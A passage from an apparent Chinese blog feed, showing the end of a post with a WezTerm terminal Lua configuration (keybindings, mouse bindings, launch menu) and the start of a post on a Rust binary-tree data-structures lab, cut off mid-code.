  right <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>
  top <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
  bottom <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

config<span class="token punctuation">.</span>initial_cols <span class="token operator">=</span> <span class="token number">120</span>
config<span class="token punctuation">.</span>initial_rows <span class="token operator">=</span> <span class="token number">30</span>
config<span class="token punctuation">.</span>window_close_confirmation <span class="token operator">=</span> <span class="token string">'NeverPrompt'</span>


<span class="token comment">-- 滚动设置</span>
config<span class="token punctuation">.</span>scrollback_lines <span class="token operator">=</span> <span class="token number">10000</span>
config<span class="token punctuation">.</span>enable_scroll_bar <span class="token operator">=</span> <span class="token keyword">true</span>

<span class="token comment">-- 快捷键</span>
config<span class="token punctuation">.</span>keys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">-- 字体大小调整</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>IncreaseFontSize <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>DecreaseFontSize <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ResetFontSize <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 重载配置</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'L'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ReloadConfiguration <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 标签页管理</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'t'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>SpawnTab <span class="token string">'CurrentPaneDomain'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'w'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">CloseCurrentTab</span><span class="token punctuation">&#123;</span> confirm <span class="token operator">=</span> <span class="token keyword">true</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'Tab'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTabRelative</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'Tab'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTabRelative</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>

  <span class="token comment">-- 分屏管理</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'d'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">SplitHorizontal</span><span class="token punctuation">&#123;</span> domain <span class="token operator">=</span> <span class="token string">'CurrentPaneDomain'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'D'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">SplitVertical</span><span class="token punctuation">&#123;</span> domain <span class="token operator">=</span> <span class="token string">'CurrentPaneDomain'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'h'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'l'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Right'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'k'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Up'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'j'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Down'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'x'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">CloseCurrentPane</span><span class="token punctuation">&#123;</span> confirm <span class="token operator">=</span> <span class="token keyword">false</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 复制粘贴，备用</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>CopyTo <span class="token string">'Clipboard'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'v'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>PasteFrom <span class="token string">'Clipboard'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 搜索</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'f'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>Search <span class="token string">'CurrentSelectionOrEmptyString'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 清屏</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'k'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ClearScrollback <span class="token string">'ScrollbackAndViewport'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 新建标签</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ShowLauncherArgs</span> <span class="token punctuation">&#123;</span> flags <span class="token operator">=</span> <span class="token string">'FUZZY|LAUNCH_MENU_ITEMS'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  
  <span class="token comment">-- 快速跳转到标签页</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'2'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'3'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'4'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'5'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">-- 鼠标绑定</span>
config<span class="token punctuation">.</span>mouse_bindings <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">-- 右键粘贴</span>
  <span class="token punctuation">&#123;</span>
    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Down <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Right'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    mods <span class="token operator">=</span> <span class="token string">'NONE'</span><span class="token punctuation">,</span>
    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>PasteFrom <span class="token string">'Clipboard'</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token comment">-- Ctrl+左键打开链接</span>
  <span class="token punctuation">&#123;</span>
    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Up <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span>
    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>OpenLinkAtMouseCursor<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Up <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span>
    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>OpenLinkAtMouseCursor<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token comment">-- 双击选中整行并复制</span>
  <span class="token punctuation">&#123;</span>
    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Up <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    mods <span class="token operator">=</span> <span class="token string">'NONE'</span><span class="token punctuation">,</span>
    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>CompleteSelection <span class="token string">'ClipboardAndPrimarySelection'</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">-- 超链接规则</span>
config<span class="token punctuation">.</span>hyperlink_rules <span class="token operator">=</span> wezterm<span class="token punctuation">.</span><span class="token function">default_hyperlink_rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment">-- 添加自定义规则</span>
table<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>hyperlink_rules<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  regex <span class="token operator">=</span> <span class="token string">[[\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b]]</span><span class="token punctuation">,</span>
  format <span class="token operator">=</span> <span class="token string">'mailto:$0'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>


<span class="token comment">-- 标签栏样式</span>
wezterm<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'format-tab-title'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>tab<span class="token punctuation">,</span> tabs<span class="token punctuation">,</span> panes<span class="token punctuation">,</span> config<span class="token punctuation">,</span> hover<span class="token punctuation">,</span> max_width<span class="token punctuation">)</span>
  <span class="token keyword">local</span> title <span class="token operator">=</span> tab<span class="token punctuation">.</span>active_pane<span class="token punctuation">.</span>title
  <span class="token keyword">if</span> tab<span class="token punctuation">.</span>is_active <span class="token keyword">then</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
      <span class="token punctuation">&#123;</span> Text <span class="token operator">=</span> <span class="token string">' 󰆍 '</span> <span class="token operator">..</span> title <span class="token operator">..</span> <span class="token string">' '</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
  <span class="token keyword">return</span> <span class="token string">' '</span> <span class="token operator">..</span> title <span class="token operator">..</span> <span class="token string">' '</span>
<span class="token keyword">end</span><span class="token punctuation">)</span>

<span class="token comment">-- Windows 特定设置</span>
<span class="token comment">-- 启动菜单 - 可以快速切换不同的 Shell</span>
config<span class="token punctuation">.</span>launch_menu <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">&#123;</span>
    label <span class="token operator">=</span> <span class="token string">'WSL Ubuntu (Fish)'</span><span class="token punctuation">,</span>
    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'wsl.exe'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'Ubuntu'</span><span class="token punctuation">,</span> <span class="token string">'--cd'</span><span class="token punctuation">,</span> <span class="token string">'/home/auceptin_fang'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'fish'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    label <span class="token operator">=</span> <span class="token string">'WSL Ubuntu'</span><span class="token punctuation">,</span>
    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'wsl.exe'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'Ubuntu'</span><span class="token punctuation">,</span> <span class="token string">'--cd'</span><span class="token punctuation">,</span> <span class="token string">'/home/auceptin_fang'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    label <span class="token operator">=</span> <span class="token string">'Windows PowerShell'</span><span class="token punctuation">,</span>
    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'powershell.exe'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    label <span class="token operator">=</span> <span class="token string">'Command Prompt'</span><span class="token punctuation">,</span>
    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'cmd.exe'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">return</span> config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>对的，顺便还安装了fish，右箭头自动命令补全真舒服吧！</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>试一下——看起来舒服多了╰(<em>°▽°</em>)╯：</p>
<p><img src="/image/wezterm/terminal.png" alt="show"></p>
<p>顺便把fish加到pwn镜像的dockerfile里</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;每天看着暗红色的终端喜新厌旧了，感觉流离用的fish命令提示功能，还有在别人博客上经常看到的暗蓝色的都好酷，正如本文的分类，家要有家的样子，遂重新配置我的终端！&lt;/p&gt;
&lt;p&gt;为什么选wezterm呢？因为它用rust实现，用lua写配置文件——因为喜欢&lt;/p&gt;
&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="家要有家的样子" scheme="https://aucept.in/categories/%E5%AE%B6%E8%A6%81%E6%9C%89%E5%AE%B6%E7%9A%84%E6%A0%B7%E5%AD%90/"/>
    
    
    <category term="terminal" scheme="https://aucept.in/tags/terminal/"/>
    
    <category term="wezterm" scheme="https://aucept.in/tags/wezterm/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-二叉树实验</title>
    <link href="https://aucept.in/2025/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-11-03T03:02:43.000Z</published>
    <updated>2025-11-24T05:50:58.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二叉树的建立与遍历"><a href="#二叉树的建立与遍历" class="headerlink" title="二叉树的建立与遍历"></a>二叉树的建立与遍历</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[问题描述]
建立一棵二叉树，并对其进行遍历(先序、中序、后序)，打印输出遍历结果。
[基本要求]
从键盘接受输入(先序)，以二叉链表作为存储结构，建立二叉树(以先序来建立)，并采用递归算法对其进行遍历(先序、中序、后序)，将遍历结果打印输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>第一轮，先定义数据结构与创建：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">BinaryTree</span> <span class="token punctuation">&#123;</span>
    data <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token punctuation">,</span>
    left <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">BinaryTree</span><span class="token operator">>></span><span class="token punctuation">,</span>
    right <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">BinaryTree</span><span class="token operator">>></span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">BinaryTree</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">BinaryTree</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">BinaryTree</span><span class="token punctuation">&#123;</span>
            data <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
            left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
            right <span class="token punctuation">:</span> <span class="token class-name">None</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> d <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nth</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token char">' '</span> <span class="token punctuation">&#123;</span>
            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"return"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"insert: &#123;&#125;"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> <span class="token keyword">mut</span> left <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        left<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> <span class="token keyword">mut</span> right <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        right<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">BinaryTree</span><span class="token punctuation">;</span>

    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> t <span class="token operator">=</span> <span class="token class-name">BinaryTree</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token string">"ABC  DE G  F   "</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
